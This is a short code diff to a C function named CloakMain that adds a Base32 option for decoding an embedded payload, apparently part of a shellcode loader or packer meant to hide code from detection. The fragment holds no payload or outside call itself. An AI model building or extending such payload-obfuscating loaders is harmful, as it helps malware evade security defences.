@@ -104,6 +104,23 @@ int CloakMain(PVOID Reserved) {
     }
     #endif // !BASE64
 
+    #ifdef BASE32
+    unsigned char* cPayload;
+    size_t cPayload_len;
+
+    cPayload_len = base32Decode( ( const char * ) Payload, &cPayload );
+
+    pbPayload = ( PBYTE* ) cPayload;
+
+    if ( pbPayload == NULL ) {
+        #ifdef DEBUG
+        printf( "[-] Failed to Decode Payload\n");
+        #endif // !DEBUG
+        
+        return 1;
+    }
+    #endif // !BASE32
+
     if ( pbPayload == NULL ) {
         pbPayload = ( PBYTE* ) &Payload;
     }
